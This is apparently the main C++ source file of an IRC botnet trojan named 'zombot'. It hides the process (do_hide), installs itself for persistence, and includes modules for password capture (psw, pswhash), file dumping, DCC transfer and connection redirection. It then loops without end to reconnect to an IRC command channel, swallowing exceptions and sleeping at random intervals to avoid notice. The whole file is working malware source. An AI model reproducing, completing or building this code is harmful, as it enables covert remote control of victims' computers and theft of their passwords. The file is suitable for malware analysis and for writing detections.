
#include <windows.h>
#include <winbase.h>
#include <winnt.h>
#include <winsock.h>

#pragma hdrstop

#ifdef ZASM
#include "zomlib.cpp"
#else
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#endif

#include "zombot.hpp"
#include "irc_rfc.hpp"

#include "hide.cpp"
#include "vars.cpp"
#include "util.cpp"
#include "time.cpp"
#include "log.cpp"
#include "random.cpp"
#include "strkill.cpp"
#include "parser.cpp"
#include "servlist.cpp"
#include "rndstr.cpp"
#include "ini.cpp"
#include "irctool.cpp"
#include "bcast.cpp"
#include "brolist.cpp"
#include "auth.cpp"
#include "aitalk.cpp"
#include "aictrl.cpp"
#include "pause.cpp"
#include "info.cpp"
#include "dir.cpp"
#include "dump.cpp"
#include "sleep.cpp"
#include "dcc.cpp"
#include "redir.cpp"
#include "pswhash.cpp"
#include "psw.cpp"
#include "action.cpp"
#include "zombotai.cpp"
#include "install.cpp"

void ircbot()
{
  sleep_main();

  log1("þ opensocket\n");
  irc_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  if (irc_socket == INVALID_SOCKET)
  {
    log2("socket() error %i\n", GetLastError());
    return;
  }

  // initvars
  irc_forward[0] = 0;
  redir_empty();
  irc_error = 0;
  brolist_init();
  irc_user_nick[0] = 0;
  online_mode = 0;
  logged_mode = 0;
  //

  irc_connect();

  if (!irc_error)
    irc_session();

  log1("þ closesocket\n");
  closesocket(irc_socket);
}

void main()
{
  do_hide();

  randomize(GetTickCount());

  strcpy(irc_time_startup, irc_gettime());

  char s[1024];
  GetModuleFileName(GetModuleHandle(0), s, sizeof(s));
  char *c = strchr(s, 0) - 4;
  strcpy(c, ".tmp"); strcpy(irc_tmpfile,s);
  strcpy(c, ".ini"); strcpy(irc_inifile,s);
  strcpy(c, ".log"); strcpy(irc_logfile,s);

  install();

  ini_load();

  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(1,1), &wsaData) != 0)
  {
    log2("WSAStartup() error %i\n", WSAGetLastError());
    return;
  }

/////////////

  if (gethostname(irc_local_host,sizeof(irc_local_host)) != ERROR_SUCCESS)
  {
    log2("gethostname() error %i\n", WSAGetLastError());
    return;
  }
  log2("- gethostname = %s\n", irc_local_host);
  hostent *h = gethostbyname(irc_local_host);
  if (!h)
  {
    log2("gethostbyname() error %i\n", WSAGetLastError());
    return;
  }
  irc_local_ip = *(DWORD*)h->h_addr_list[0];
  strcpy(irc_local_ip_str, IP2STR(irc_local_ip));
  log2("- gethostbyname: IP = %s\n", irc_local_ip_str);

  while (1)
  {
    int seh_error = 0;
#ifdef ZASM
    asm
    {
                        pusha
                        call    my_sehinit
                        mov     esp, [esp+8]
                        stc
                        jmp     my_sehexception
my_sehinit:             push    dword ptr fs:[0]
                        mov     fs:[0], esp
    }
#else
    __try
    {
#endif

    ircbot();

#ifdef ZASM
my_sehexit:
    asm
    {
                        clc
my_sehexception:        pop     dword ptr fs:[0]
                        pop     eax
                        popa
                        rcl     seh_error, 1
    }
#else
    }
    __except(1)
    {
      seh_error++;
    }
#endif

    if (seh_error)
    {
      log1("þ exception\n");
      irc_count_exceptions++;
      closesocket(irc_socket);          // !
    }

    if (irc_error != 0)
    {
      if (!logged_mode)
      {
        cantlogin_count = (cantlogin_count + 1) % MAXCANTLOGIN;
        log2("þ cantlogin_count = %i\n", cantlogin_count);
        if (cantlogin_count == 0)
        {
          log1("þ sleep\n");
          Sleep(rndR(5*60*1000,10*60*1000));        // Sleep( 5..10 min )
        }
      }
    }

  }

//WSACleanup();
}
